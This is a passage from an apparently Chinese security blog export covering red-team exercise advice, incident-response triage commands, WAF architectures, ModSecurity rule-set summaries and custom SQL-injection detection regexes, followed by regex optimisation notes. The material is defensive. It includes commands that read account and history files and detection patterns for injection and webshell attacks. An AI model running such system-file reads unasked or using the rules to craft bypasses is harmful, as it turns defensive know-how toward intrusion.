持续跟进，复盘测试\n\n因为中小型企业个人认为还是以全为主，尽可能把漏洞修复完。大型公司可以大量的人力投入，业务也繁多，还是以结果导向，漏洞的薄弱点由红队确认，所以方法就没有统一的标准。\n\n# 红蓝对抗注意事项\n\n1. 测试前提前报备\n2. 有可能会影响到业务的操作时候务必提前沟通\n3. 漏洞的确认按照公司的规范制度制定\n4. 漏洞和业务沟通确认后再发工单修复\n5. 漏洞闭环\n\n这边需要注意的是测试需要提前报备，免得事后被业务捅，更要注意的是测试千万不要影响到业务。 还有经常有点大家会忽略的是，一定要进行漏洞闭环，发现漏洞而不去解决漏洞等于无效漏洞。\n\n# 红蓝对抗所需技术\n\n红蓝对抗不同于渗透测试，红蓝对抗测试的范围很广泛，不仅需要渗透技术，还需要逆向、脚本编程、各种绕过黑魔法等。所以，红蓝对抗不仅需要渗透测试的人才，也需要逆向的工程师，甚至是区块链安全工程师、数据安全方向的工程师等，所以说其实在大公司更容易开展红蓝对抗，因为大公司人才更加齐全。红蓝对抗也需要团队的协作，一个人是比较难完成的，更好的方式，不同的团队进行红蓝对抗，每个团队攻击的方法思路也不尽相同，更能模拟真实的场景攻击，对于红队查缺补漏也更有帮助。如下，是用到的一小部分工具：\n\n1. Python\n2. IDA\n3. JEB\n4. Masscan\n5. Nmap\n6. Metasploit\n7. 搜集的各类样本\n\n# 总结\n\n红蓝对抗一定要区别于渗透测试，渗透测试这是每个公司的标配。红蓝对抗的价值在于挖掘渗透测试不关注的漏洞或者渗透测试无法覆盖的点，并且持续的对抗，不断帮助业务提升安全能力，完善自己的安全防御。根据自己做的红蓝对抗经验来说，我们发现办公安全助手的漏洞、waf的部署缺和绕过缺陷以及HIDS一些缺陷等。其实这些东西渗透测试很少会去涉及和考虑，而红蓝对抗的作用就显现，这些风险的发现对于自身的安全防御是有很大的帮助的，因为你挖漏洞只是修修补补，而做这些红蓝对抗发现的问题，则是解决一类的问题。对于这种方式的对抗，老大也认可，自己也有很有满足感，所以对于红蓝对抗，其实是很适合互联网安全团队去尝试组建的。\n\n ![img](/images/hldk/2.png) ","tags":["红蓝对抗","攻击手段"],"categories":["安全杂谈"]},{"title":"应急响应总结","url":"/2020/03/30/应急响应总结/","content":"\n当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作。进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。\n\n## 安全事件分类\n\n1. Web入侵:挂马、篡改、Webshell\n2. 系统入侵:系统异常、RDP爆破、SSH爆破、主机漏洞\n3. 病毒木马:远控、后门、勒索软件\n4. 信息泄漏:脱裤、数据库登录（弱口令）\n5. 网络流量:频繁发包、批量请求、DDOS攻击\n\n首先是对入侵的安全事件进行分类，确认安全事件属于哪类入侵，然后用相应的方法应急。\n\n## 安全事件分级\n\n**I 级事件 -- 特别重大突发事件**\n\n1. 网络大面积中断\n2. 主要业务大规模瘫痪\n3. 大规模用户/业务数据泄漏\n\n**II 级事件 -- 重大突发事件**\n\n1. 大规模主机入侵\n2. 大规模业务数据损坏\n3. 小规模数据泄漏\n4. 政治敏感事件:官网挂黑页\n\n**III 级事件 -- 较大突发事件**\n\n1. 部分业务系统遭受入侵\n2. 主要业务遭受DDOS\n\n**IV 级事件 -- 一般突发事件**\n\n1. 部分业务系统宕机\n2. 部分业务系统异常/无法访问\n\n通过对安全事件的定级，确认属于什么级别的事故，采取相应的应急预案和紧急程度的确认。\n\n## 安全响应执行流程\n\n1. 事件发生（运维监控人员、客服审核人员等），发现问题的开始，及时通报\n2. 事件确认:判断事件的严重性，评估出问题的严重等级，是否向上进行汇报等\n3. 事件响应:各部门通力合作，处理安全问题，具体解决阶段\n4. 事件关闭:处理完事件之后，需要关闭事件，并写出安全应急处理分析报告，完成整个应急过程\n\n## 被入侵的主机排查流程\n\n1. 定位被入侵的主机并且立即对该主机进行断网隔离\n2. 确定攻击类型\n3. 确定被入侵的时间范围\n4. 定位恶意文件和入侵痕迹\n5. 溯源入侵来源\n6. 清理恶意文件/修复漏洞\n7. 事件复盘\n\n其实这是web安全工作人员最常见的排查流程，因为例如ddos这类的事件可能托管在运维侧，而安全工程师常常是应急网站被入侵后的安全事件。\n\n## 被入侵的主机排查方法\n\n1.检测补丁情况:看看有没有打了最新的补丁,看看是不是用漏洞搞进来的\n\n- systeminfo | uname -a\n\n\n2.日志分析:定位入侵路线,是系统配置出了问题(ssh 弱口令,域管理员hash 泄漏)还是WEB 服务出了问题(传马,WEB 漏洞利用)\n\n- eventvwr | /var/log , .bash_history\n- access.log mysql_log.log\n\n\n3.账户信息:先看看是不是帐户有弱口令,再看看用户的登录时间,也观察一下有没有给留后门账户\n\n- quser | who last\n\n\n4.进程分析:定位一下看看有没有运行恶意进程\n\n- procxp , pchunter | ps -aux , chkrootkit , rkhunter\n\n\n5.文件分析:找找Shell 和后门,看看这个是什么样的Shell\n\n- lchangedfiles | find / -ctime -1 -print\n\n\n6.系统分析:计划任务,自启动服务等\n**Linux :**\n\n- history (cat /root/.bash_history) 查看执行过的命令,排查和溯源\n- /etc/passwd 分析用户\n- awk -F: '{if($3==0)print $1}' /etc/passwd 查看UID 为0 的帐号\n- cat /etc/passwd | grep -E \"/bin/bash$\" 查看可以登录的帐号\n- crontab /etc/cron* 查看计划任务\n- rc.local /etc/init.d chkconfig 查看Linux 自启动程序\n- last 查看最近用户登录信息\n- lastb 查看最近用户登录错误信息\n- $PATH 系统路径环境变量\n- strings 提取字符串\n\n\n**Windows :**\n\n- 查看系统变量\n- Windows 计划任务\n- Windows 帐号信息\n- SAM 文件\n- Windows-Exploit-Suggester\n\n附上常用应急命令：\n\n![img](/images/yjxy/1.png)","tags":["应急响应","linux命令"],"categories":["安全杂谈"]},{"title":"waf杂谈","url":"/2020/02/28/waf杂谈/","content":"\n# waf架构   \n\nwaf架构章节直接引用腾讯应急响应中心的[《主流WAF架构分析与探索》](https://security.tencent.com/index.php/blog/msg/56)\n\n## 方案A：本机服务器模块模式\n\n![img](/images/waf/2/1.png)\n\n通过在Apache，IIS等Web服务器内嵌实现检测引擎，所有请求的出入流量均先经过检测引擎的检测，如果请求无问题则调用CGI处理业务逻辑，如果请求发现攻击特征，再根据配置进行相应的动作。以此对运行于Web服务器上的网站进行安全防护。著名的安全开源项目ModSecurity及naxsi防火墙就是此种模式。\n\n**优点：**\n\n1. 网络结构简单，只需要部署Web服务器的安全模块\n\n**挑战：**\n\n1. 维护困难。当有大规模的服务器集群时，任何更新都涉及到多台服务器。\n\n2. 需要部署操作，在面临大规模部署时成本较高。\n\n3. 无集中化的数据中心。针对安全事件的分析往往需要有集中式的数据汇总，而此种模式下用户请求数据分散在各个Web服务器上。\n\n## 方案B：反向代理模式\n\n![img](/images/waf/2/2.png)\n\n使用这种模式的方案需要修改DNS，让域名解析到反向代理服务器。当用户向某个域名发起请求时，请求会先经过反向代理进行检测，检测无问题之后再转发给后端的Web服务器。这种模式下，反向代理除了能提供Web安全防护之外，还能充当抗DDoS攻击，内容加速（CDN）等功能。云安全厂商CloudFlare采用这种模式。\n\n**优点：**\n\n1. 集中式的流量出入口。可以针对性地进行大数据分析。\n\n2. 部署方便。可多地部署，附带提供CDN功能。\n\n**挑战：**\n\n1. 动态的额外增加一层。会带来用户请求的网络开销等。\n\n2. 站点和后端Web服务器较多的话，转发规则等配置较复杂。\n\n3. 流量都被捕捉，涉及到敏感数据保护问题，可能无法被接受。\n\n## 方案C：硬件防护设备\n\n![img](/images/waf/2/3.png)\n\n这种模式下，硬件防护设备串在网络链路中，所有的流量经过核心交换机引流到防护设备中，在防护设备中对请求进行检测，合法的请求会把流量发送给Web服务器。当发现攻击行为时，会阻断该请求，后端Web服务器无感知到任何请求。防护设备厂商如imperva等使用这种模式。\n\n**优点：**\n\n1. 对后端完全透明。\n\n**挑战：**\n\n1. 部署需改变网络架构，额外的硬件采购成本。\n\n2. 如Web服务器分布在多个IDC，需在多个IDC进行部署。\n\n3. 流量一直在增加，需考虑大流量处理问题。以及流量自然增长后的升级维护成本。\n\n4. 规则依赖于厂商，无法定制化，不够灵活。 \n\n## 方案D：服务器模块+检测云模式\n\n![img](/images/waf/2/4.png)\n\n这种模式其实是方案A的增强版，也会在Web服务器上实现安全模块。不同点在于，安全模块的逻辑非常简单，只是充当桥梁的作用。检测云则承担着所有的检测发现任务。当安全模块接收到用户的请求时，会通过UDP或者TCP的方式，把用户请求的HTTP文本封装后，发送到检测云进行检测。当检测无问题时，告知安全模块把请求交给CGI处理。当请求中检测到攻击特征时，则检测云会告知安全模块阻断请求。这样所有的逻辑、策略都在检测云端。\n\n我们之所以选择这个改进方案来实现防护系统，主要是出于以下几个方面的考虑：\n\n**1、维护问题**\n\n假如使用A方案，当面临更新时，无法得到及时的响应。同时，由于安全逻辑是嵌入到Web服务器中的，任何变更都存在影响业务的风险，这是不能容忍的。\n\n**2、网络架构**\n\n如果使用方案B，则需要调动大量的流量，同时需要提供一个超大规模的统一接入集群。而为了用户就近访问提高访问速度，接入集群还需要在全国各地均有部署，对于安全团队来说，成本和维护难度难以想象。\n\n**使用该方案时，需要考虑如下几个主要的挑战：**\n\n1、 网络延时\n\n采用把检测逻辑均放在检测云的方式，相对于A来说，会增加一定的网络开销。不过，如果检测云放在内网里，这个问题就不大，99%的情况下，同城内网发送和接收一个UDP包只需要1ms。\n\n2、性能问题：\n\n由于是把全量流量均交给集中的检测云进行检测，大规模的请求可能会带来检测云性能的问题。这样在实现的时候就需要设计一个好的后端架构，必须充分考虑到负载均衡，流量调度等问题。\n\n3、 部署问题：\n\n该方案依然需要业务进行1次部署，可能会涉及到重编译web服务器等工作量，有一定的成本。并且当涉及到数千个域名时，问题变的更为复杂。可能需要区分出高危业务来对部署有一个前后顺序，并适时的通过一些事件来驱动部署。\n\n# Modsecurity waf规则\n\nmodsecurity是一款知名的waf开源，并且owasp开源了一套对应的[检测规则](https://www.modsecurity.org/rules.html)，非常值得我们借鉴和学习。\n\n中文使用参考：  http://www.modsecurity.cn/\n\n中文手册： http://www.modsecurity.cn/chm/index.html\n\n### 参数说明\n\nModesecurity : **Security Paranoia Level**\n\n**Level 1 (Default):**A dequate security to protect almost all web applications from generic exploits. We recommend most users to use this level by default, to ensure minimum disruption from false positives.\n\n**Level 2:**A slightly higher level of security to block almost all web application exploits. This may result in some false positives.\n\n**Level 3:**A more paranoid approach to web security. You may experience a higher number of false positives.\n\n**Level 4 (most paranoid):** The most paranoid, preventive approach to security. This mode may block quite a number legitimate requests to your site.\n\n**总结：**Security Paranoia Level  等级越高，对应规则误报就也大。\n\n## [旧版规则集](https://github.com/fabiocicerchia/OWASP-CRS)\n\n###  基本规则集\n\nmodsecurity_crs_20_protocol_violations.conf - HTTP协议规范相关规则\n\nmodsecurity_crs_21_protocol_anomalies.conf - HTTP协议规范相关规则\n\nmodsecurity_crs_23_request_limits.conf - HTTP协议大小长度限制相关规则\n\nmodsecurity_crs_30_http_policy.conf - HTTP协议白名单相关规则\n\nmodsecurity_crs_35_bad_robots.conf - 恶意扫描器与爬虫规则\n\nmodsecurity_crs_40_generic_attacks.conf - 常见的攻击例如命令执行，代码执行，注入，文件包含、敏感信息泄露、会话固定、HTTP响应拆分等相关规则\n\nmodsecurity_crs_41_sql_injection_attacks.conf - SQL注入相关规则（竟然有一条MongoDB注入的规则，很全）\n\nmodsecurity_crs_41_xss_attacks.conf - XSS相关规则\n\nmodsecurity_crs_42_tight_security.conf - 目录遍历相关规则\n\nmodsecurity_crs_45_trojans.conf - webshell相关规则\n\nmodsecurity_crs_47_common_exceptions.conf - Apache异常相关规则\n\nmodsecurity_crs_49_inbound_blocking.conf - 协同防御相关规则\n\nmodsecurity_crs_50_outbound.conf - 检测response_body中的错误信息，警告信息，列目录信息\n\nmodsecurity_crs_59_outbound_blocking.conf - 协同防御相关规则\n\nmodsecurity_crs_60_correlation.conf - 协同防御相关规则\n\n### SLR规则集\n\n来自确定APP的PoC，不会误报，检测方法是先检查当前请求的文件路径是否出现在data文件中，若出现再进行下一步测试，否则跳过该规则集的检测\n\nmodsecurity_crs_46_slr_et_joomla_attacks.conf -JOOMLA应用的各种漏洞规则\n\nmodsecurity_crs_46_slr_et_lfi_attacks.conf - 各种APP的本地文件包含相关规则\n\nmodsecurity_crs_46_slr_et_phpbb_attacks.conf - PHPBB应用的各种漏洞规则\n\nmodsecurity_crs_46_slr_et_rfi_attacks.conf - 各种APP的远程文件包含相关规则\n\nmodsecurity_crs_46_slr_et_sqli_attacks.conf - 各种APP的SQL注入相关规则\n\nmodsecurity_crs_46_slr_et_wordpress_attacks.conf - WORDPRESS应用的各种漏洞规则\n\nmodsecurity_crs_46_slr_et_xss_attacks.conf - 各种APP的XSS相关规则\n\n### 可选规则集\n\nmodsecurity_crs_10_ignore_static.conf - 静态文件不过WAF检测的相关规则\n\nmodsecurity_crs_11_avs_traffic.confAVS -（授权的漏洞扫描器）的IP白名单规则\n\nmodsecurity_crs_13_xml_enabler.conf - 请求体启用XML解析处理\n\nmodsecurity_crs_16_authentication_tracking.conf - 记录登陆成功与失败的请求\n\nmodsecurity_crs_16_session_hijacking.conf - 会话劫持检测\n\nmodsecurity_crs_16_username_tracking.conf - 密码复杂度检测\n\nmodsecurity_crs_25_cc_known.conf - CreditCard验证\n\nmodsecurity_crs_42_comment_spam.conf - 垃圾评论检测\n\nmodsecurity_crs_43_csrf_protection.conf与modsecurity_crs_16_session_hijacking.conf - 联合检测，使用内容注入动作append注入CSRF Token\n\nmodsecurity_crs_46_av_scanning.conf - 使用外部脚本扫描病毒\n\nmodsecurity_crs_47_skip_outbound_checks.conf - modsecurity_crs_10_ignore_static.conf的补充\n\nmodsecurity_crs_49_header_tagging.conf - 将WAF规则命中情况配合Apache RequestHeader指令注入到请求头中，以供后续应用进一步处理\n\nmodsecurity_crs_55_marketing.conf - 记录MSN/Google/Yahoorobot情况\n\n### 实验性规则集\n\nmodsecurity_crs_11_brute_force.conf - 防御暴力破解相关规则\n\nmodsecurity_crs_11_dos_protection.conf - 防DoS攻击相关规则\n\nmodsecurity_crs_11_proxy_abuse.conf检测X-Forwarded-For是否是恶意代理IP，IP黑名单\n\nmodsecurity_crs_11_slow_dos_protection.conf - Slow HTTP DoS攻击规则\n\nmodsecurity_crs_25_cc_track_pan.conf - 检测响应体credit card信息\n\nmodsecurity_crs_40_http_parameter_pollution.conf - 检测参数污染\n\nmodsecurity_crs_42_csp_enforcement.conf - CSP安全策略设置\n\nmodsecurity_crs_48_bayes_analysis.conf - 使用外部脚本采取贝叶斯分析方法分析HTTP请求，区分正常与恶意请求\n\nmodsecurity_crs_55_response_profiling.conf - 使用外部脚本将响应体中的恶意内容替换为空\n\nmodsecurity_crs_56_pvi_checks.conf - 使用外部脚本检测REQUEST_FILENAME是否在osvdb漏洞库中\n\nmodsecurity_crs_61_ip_forensics.conf - 使用外部脚本收集IP的域名、GEO等信息\n\nmodsecurity_crs_40_appsensor_detection_point_2.0_setup.conf - APPSENSOR检测设置文\n\n## [新版规则集]( https://github.com/SpiderLabs/owasp-modsecurity-crs/tree/v3.3/dev/rules )\n\n### 应用攻击\n\n> 常见的web攻击方法，例如sql、xss、rce等\n\n**REQUEST-930-APPLICATION-ATTACK-LFI.conf - 本地文件包含攻击**\n\n- Directory Traversal Attacks - 目录遍历攻击\n- OS File Access - 系统文件检测 ，通过lfi-os-files.data定义文件集\n- Restricted File Access - 受限文件检测，通过restricted-files.data定义文件集\n\n**REQUEST-931-APPLICATION-ATTACK-RFI.conf - 远程文件包含攻击**\n\n```bash\n# [检测逻辑]\n\t- URL Contains an IP Address\t\t\t\t\turl包含一个地址ip\n\t- The PHP \"include()\" Function \t\t\t\t\tinclude()等函数\n\t- RFI Data Ends with Question Mark(s) (?)\t\t参数以？结尾\n\t- RFI Host Doesn\\'t Match Local Host\t\t\t\thost不匹配本地host\n```\n\n**REQUEST-932-APPLICATION-ATTACK-RCE.conf - 远程代码执行攻击**\n\n- Unix command injection - unix命令执行\n- Windows command injection - windows命令执行\n- Windows PowerShell, cmdlets and options - windows powershell命令检测，由windows-powershell-commands.data定义命令集\n\n- Unix shell expressions - unix shell表达式\n- Windows FOR, IF commands - windows for, if命令集\n- Unix direct remote command execution - unix 直接执行远程命令 \n- Unix shell snippets - unix常见攻击序列检测，由unix-shell.data定义序列集 \n- Shellshock vulnerability - shellshock漏洞检测\n- Restricted File Upload - 受限文件上传，通过restricted-upload.data定义文件集\n\n**REQUEST-933-APPLICATION-ATTACK-PHP.conf - PHP攻击**\n\n- PHP Injection Attacks - php注入攻击\n  - PHP Open Tag Found - php 标志检测\n  - PHP Script Uploads - php 脚本上传\n  - PHP Configuration Directives - php配置指令检测，由php-config-directives.data定义指令集 \n  - PHP Variables - php变量检测，由php-variables.data定义变量集\n  - PHP I/O Streams - php io流检测\n  - PHP Wrappers - php包装检测，eg: `phar://`\n  - PHP Functions - php函数检测\n  - PHP Object Injection - php对象注入\n  - **...snip...** -  php函数调用，变量的变形检测等\n\n**REQUEST-934-APPLICATION-ATTACK-NODEJS.conf - NODEJS攻击**\n\n- Insecure unserialization / generic RCE signatures - 不安全的序列化/通用的rce指纹\n\n**REQUEST-941-APPLICATION-ATTACK-XSS.conf - XSS攻击**\n\n- Libinjection - XSS Detection - 使用[libinjection](https://github.com/client9/libinjection)引擎进行XSS检测\n- XSS Filters - Category 1 - 基于脚本标签的XSS向量\n- XSS Filters - Category  2 - 基于onerror、onload等事件的XSS向量\n- XSS Filters - Category 3 -  regexp-941130.data上定义的正则，可使用`regexp-assemble.pl`编译成一条正则\n- XSS Filters - Category 4 -  利用javascript uri和标签的XSS矢量\n- NoScript XSS Filters - 无script标签检测\n  - [NoScript InjectionChecker] HTML injection regexp-941160.data上定义的正则，可使用`regexp-assemble.pl`编译成一条正则\n  - [NoScript InjectionChecker] Attributes injection 属性检测\n  - [Blacklist Keywords from Node-Validator] - 来自Node-Validator的黑名单关键字\n- XSS Filters from IE - 来自IE的XSS过滤器\n- XSS Filters - Category 5  - src, style 和href 属性检测\n\n**REQUEST-942-APPLICATION-ATTACK-SQLI.conf - SQL攻击**\n\n- LibInjection Check  - 使用[libinjection](https://github.com/client9/libinjection)引擎进行SQL检测\n- Detect DB Names - 检测数据库名字，regexp-942140.data上定义的正则，可使用`regexp-assemble.pl`编译成一条正则\n- [PHPIDS](https://raw.github.com/PHPIDS/PHPIDS/master/lib/IDS/default_filter.xml) - Converted SQLI Filters -使用PHPIDS规则检测，包括union,sleep注入等\n- Detect MySQL in-line comments - 检测mysql内联注释\n- String Termination/Statement Ending Injection Testing - 字符串终止/声明截止注入测试\n- SQL Operators - sql操作符检测，eg: like、in、between等\n- SQL Function Names - sql函数名检测\n- SQL Injection Probings - sql注入探测检测\n- SQL Injection Character Anomaly Usage  - SQL注入字符异常用法 \n- Detect SQL Comment Sequences - 检测sql注释序列\n- SQL Hex Evasion Methods - 六十进制规避方法检测\n- Detect SQLi bypass: backticks - 检测反引号绕过\n- Repetitive Non-Word Characters - 重复的非单词检测\n- Detect SQLi bypass: quotes - 检测sql引号绕过\n\n**REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf - 会话固定攻击**\n\n- 在html中包含有设置cookie变量值的内容\n- 参数中jsessionid等变量的http值和referer的host不相等\n- 参数中jsessionid等变量请求没referer\n\n**REQUEST-943-APPLICATION-ATTACK-JAVA.conf - JAVA应用攻击**\n\n- java远程命令执行payload检测\n- java序列化函数检测\n- java class检测，由java-classes.data定义class集\n- java反序列化特定字符检测\n- java反序列化特定字符base64编码检测\n- java远程命令执行函数base64编码检测\n\n### 数据泄露\n\n以下几个规则是对phase4（http响应阶段）的检测，检测响应中是否存在数据泄露：\n\n- RESPONSE-950-DATA-LEAKAGES.conf\n- RESPONSE-951-DATA-LEAKAGES-SQL.conf\n- RESPONSE-952-DATA-LEAKAGES-JAVA.conf\n- RESPONSE-953-DATA-LEAKAGES-PHP.conf\n- RESPONSE-954-DATA-LEAKAGES-IIS.conf\n\n### 排除误报\n\n以下几个都是排除特定cms安装时的误报：\n\n- REQUEST-903.9001-DRUPAL-EXCLUSION-RULES.conf\n- REQUEST-903.9002-WORDPRESS-EXCLUSION-RULES.conf\n- REQUEST-903.9003-NEXTCLOUD-EXCLUSION-RULES.conf\n- REQUEST-903.9004-DOKUWIKI-EXCLUSION-RULES.conf\n- REQUEST-903.9005-CPANEL-EXCLUSION-RULES.conf\n- REQUEST-903.9006-XENFORO-EXCLUSION-RULES.conf\n\n### 其他\n\n文件结构很清晰，大家可以自行分析。\n\n- dos攻击检测阻断\n- 扫描器检测阻断\n- 恶意ip检测阻断\n- http协议攻击检测（包括http请求夹带攻击、http拆分响应攻击等）\n\n## 如何提炼规则\n\nmodsecurity中包含了许多非常有价值的waf规则，我们自研waf可能需要筛选和整合modsecurity的规则，那如何提炼modsecurity的规则呢，我给出一点小建议：\n\n- **[规则说明文档](http://www.modsecurity.cn/chm/)：**modsecurity配置文件中包含许多指令，遇到不懂再去文档里查，不需要上来就把文档看个遍。\n\n- **检测位置：**提炼出该规则检测的http请求哪部分，比如body,url,还是请求参数等\n\n- **分析正则：**直接出conf文件中提炼出正则表达式，如果是字符匹配，直接提取特征字符。\n\n- **测试理解：**有些正则很复杂，可以通过以下一些方法进行分析：\n\n  - 可以使用[regexbuddy](http://www.regexbuddy.com/)这款工具进行分析，在线分析可以使用[regex101](https://regex101.com/)。\n\n    ![](/images/waf/2/5.png)\n\n  - crs中有很多规则是使用[Regexp::Assemble](https://metacpan.org/release/Regexp-Assemble)把文件中的正则集生成一条正则的，我们也可以分析文件中的每条规则然后理解整个正则的含义。\n\n  - crs中每个正则都有对应测试文件，也可能根据测试文件的payload来大概了解\n\n    ![](/images/waf/2/6.png)\n\n- **生成对应的规则：**自研的waf规则可能是一个json文件，就把上述提取的检测位置和正则提取到json文件中，如果一些规则不会用到就精简掉，一些规则有绕过则补充进去。\n\n# 自研waf规则设计\n\nmodsecurity规则很强大，但是对于新开发的waf系统来说过于臃肿，自研waf前期功能不需要那么复杂的规则和字段，但是最基础的字段是必须具备的：\n\n- **动作** ：deny, view  观察还是阻断\n\n- **检测参数：** ARGS_NAMES, URI, BODY....  具体类型可以参考modsecurity\n- ***阶段：**这个字段是可选字段，如果只考虑请求阻断，而不做响应阶段的数据泄露检测，此字段可以不用。\n\n正则效率评估：[regexbuddy](http://www.regexbuddy.com/)或者[regex101](https://regex101.com/)进行评估，该工具可以匹配正则匹配具体执行了多少步，执行步数越长，代表正则效率越低。\n\n- ***解码：**此字段也是可选。虽然解码是waf检测中比不可少的（通过解码可以减少很多变形规则的编写），但是解码可以通过类型直接定义在代码中，或者通过配置文件自定义。推荐通过第二种方法进行操作，这种灵活性更强。\n\n## 案例\n\n规则检测类型不需要根据modsecurity来分类命名，我们可以自己按照自己的攻击理解进行分类命名并精简规则。贴出两个自研waf的sql注入规则案例。\n\n```yaml\nname:\n\tsqli1(sqli条件和字符注入)\nrule:\n\t(?:\\)\\s*when\\s*\\d+\\s*then)|(?:\"\\s*(?:#|--|{))|(?:\\/\\*!\\s?\\d+)|(?:ch(?:a)?r\\s*\\(\\s*\\d)|(?:(?:(n?and|x?or|not)\\s+|\\|\\||\\&\\&)\\s*\\w+\\()\naction:\n\tdeny\ntransfer:\n\turlDecodeUni\n\nname:\n\tclassic_sqli\nrule:\n\t(?:\"\\s*or\\s*\"?\\d)|(?:\\\\x(?:23|27|3d))|(?:^.?\"$)|(?:(?:^[\"\\\\]*(?:[\\d\"]+|[^\"]+\"))+\\s+(?:n?and|x?or|not|\\|\\||\\&\\&)\\s+[\\w\"[+&!@(),.-])|(?:[^\\w\\s]\\w+\\s*[|-]\\s*\"\\s*\\w)|(?:@\\w+\\s+(and|or)\\s*[\"\\d]+)|(?:@[\\w-]+\\s(and|or)\\s*[^\\w\\s])|(?:\\Winformation_schema|table_name\\W)\naction:\n\tview\ntransfer:\n\turlDecodeUni\n```\n\n# 评估waf的好坏\n\n一般来说评估waf的好坏无外乎两方面，误报率和漏报率。（当然还有waf系统占用率以及waf系统的响应速，不过这两条作为waf系统最基本项要求，如果这两项都不达标，影响了业务，业务是不可能让你上waf的）。\n\n误报率，漏报率这两个指标其实是自相矛盾的。所以在安全和效率(业务)的博弈中，没有完美，只有适配。对于业务来说，误报拦截对他们的影响大于漏报，所以waf在尽可能覆盖全漏洞的情况下，误报的优化优先级应该大于漏报。\n\n## waf评测工具\n\nhttps://github.com/tanjiti/WAFTest \n\nhttps://github.com/khalilbijjou/WAFNinja\n\nhttps://github.com/fastly/ftw\n\nhttps://github.com/f5devcentral/f5-waf-tester\n\n# 如何降误报\n\nwaf需要有至少两个模式**观察模式**（仅记录不拦截）和**阻断模式**。新规则上线前，需要在生产上进行一周到一个月的观察模式。通过持续的观察误拦截情况，动态调整该规则的策略，待策略稳定后正式切换到阻断模式。\n\n当然还可以以旁路模式部署waf，这样相当于一个离线分析系统，不会对线上业务造成影响，同样可以测试优化规。\n\n规则的优化（大部分就是正则误报的优化），需要大量的实践优化会得出比较好的结果。大公司就是有这方面的优势，天天被黑客盯着，能搜集到很多意想不到的规则。而针对中小长要搜集到大量的攻击场景不容易，一方面小厂商需要做好最基础的几项的误报和检测，如果想进一步优化和补充，可以搭建开源蜜罐进行搜集测试。\n\n\n\n**参考：**\n\nhttps://www.netnea.com/cms/apache-tutorial-8_handling-false-positives-modsecurity-core-rule-set/ \n\nhttps://www.modsecurity.org/CRS/Documentation/making.html\n\nhttps://cloud.tencent.com/developer/article/1484151","tags":["waf规则","modsecurity","误报优化"],"categories":["waf"]},{"title":"正则表达式优化总结","url":"/2020/02/11/正则表达式优化总结/","content":"\n## 什么是正在表达式\n\n正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。\n\n正则表达式快速入门可参考：https://www.w3cschool.cn/regex_rmjc/。正则表达式里包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为\"元字符\"）。简单的基础不用多讲，讲几个正则中重要又稍微难懂的概念。\n\n### 回溯\n\n正则引擎主要可以分为基本不同的两大类：一种是DFA(确定性有穷自动机），另一种是NFA（非确定性有穷自动机）。在NFA中由于表达式主导的串行匹配方式，所以用到了回溯（backtracking），这个是NFA最重要的部分，每一次某个分支的匹配失败都会导-致一次回溯。\n\n回溯法也称试探法，它的基本思想是：从问题的某一种状态（初始状态）出发，搜索从这种状态出发所能达到的所有“状态”，当一条路走到“尽头”的时候（不能再前进），再后退一步或若干步，从另一种可能“状态”出发，继续搜索，直到所有的“路径”（状态）都试探过。这种不断“前进”、不断“回溯”寻找解的方法，就称作“回溯法”。\n\n举个例子更能直观说明。正则是 **/ab{1,3}c/** ，其可视化形式是：\n\n![img](/images/waf/1/1.png)\n\n而当目标字符串是\"abbbc\"时，就没有所谓的“回溯”。其匹配过程是：\n\n![img](/images/waf/1/2.png) \n\n如果目标字符串是\"abbc\"，中间就有回溯。\n\n![img](/images/waf/1/3.png)\n\n### 贪婪匹配和非贪婪匹配\n\n当正则表达式中包含能接受重复的限定符时，通常的行为是（在使整个表达式能得到匹配的前提下）**匹配尽可能多的字符**。以这个表达式为例： **a.\\*b** ，它将会匹配最长的以a开始，以b结束的字符串。如果用它来搜索 aabab 的话，它会匹配整个字符串 aabab。这被称为贪婪匹配。\n\n非贪婪匹配就是尽可能少的匹配。一下几个是非贪婪匹配常见的用法。\n\n![img](/images/waf/1/4.png)\n\n以 a.*?b 为例，用它来搜索 aabab 的话，他它会匹配 aab（第一到第三个字符）和 ab（第四到第五个字符）\n\n![img](/images/waf/1/5.png)\n\n### 捕获和断言\n\n![img](/images/waf/1/6.png)\n\n**捕获：**当我们使用小括号指定一个子表达式之后，就要对这个子表达式的文本进行匹配，即此分组捕获的内容，可以在表达式或其它程序中作进一步的处理。一般情况下，每个分组都会自动拥有一个组号，它的规则是：从左到右以分组的左括号作为标志，把第一次出现的分组的组号定为1，第二个即2，以此类推下去。\n\n**后向引用**：用于重复搜索前面某个分组匹配的文本。例如，\\1代表分组1匹配的文本。我们根据示例来深刻理解： **\\b(\\w+)\\b\\s+\\1\\b** 可以用来匹配重复的单词，像go go。\n\n**非捕获组**：第三个 **(?:exp)** 不会改变正则表达式的处理方式，只是这样的组匹配的内容不会像前两种那样被捕获到某个组里面，也不会拥有组号。\n\n**零宽断言：**用于查找在某些内容的之前或之后的东西，但是有不包含这些内容本身的时候，零宽断言就起到作用了。\n\n**(?=exp) ：**也叫零宽度正预测先行断言，它断言自身出现的位置的后面能匹配表达式exp。比如 **\\b\\w+(?=ing\\b)**，匹配以ing结尾的单词的前面部分(除了ing以外的部分)，如查找I'm singing while you're dancing.时，它会匹配sing和danc。\n\n**(?<=exp) ：**也叫零宽度正回顾后发断言，它断言自身出现的位置的前面能匹配表达式exp。比如 **(?<=\\bre)\\w+\\b** 会匹配以re开头的单词的后半部分(除了re以外的部分)，例如在查找reading a book时，它匹配ading。\n\n## 正则优化\n\n正则在安全领域中最常见的用途是用来编写安全策略，比如WAF的拦截策略以及HIDS对应的webshell检测策略等。以下归纳了几点正则优化的策略：\n\n### a) 合理使用括号\n\n当要捕获组的时候，使用非捕获型括号(?:)，这是写策略正则最常用的优化方法，因为使用(?:)可以匹配想要的内容，但不捕获到组里，可以节省资源，提高效率。\n\n### b) 使用非贪婪模式\n\n尽量使用非贪婪模式，因为贪婪模式情况下，容易造成回溯。如果不确定使用哪种模式，优先考虑\n\n### c）使用字符组代替分支条件\n\n使用[a-d]表示a~d之间的字母，而不是使用(a|b|c|d)\n\n### d) 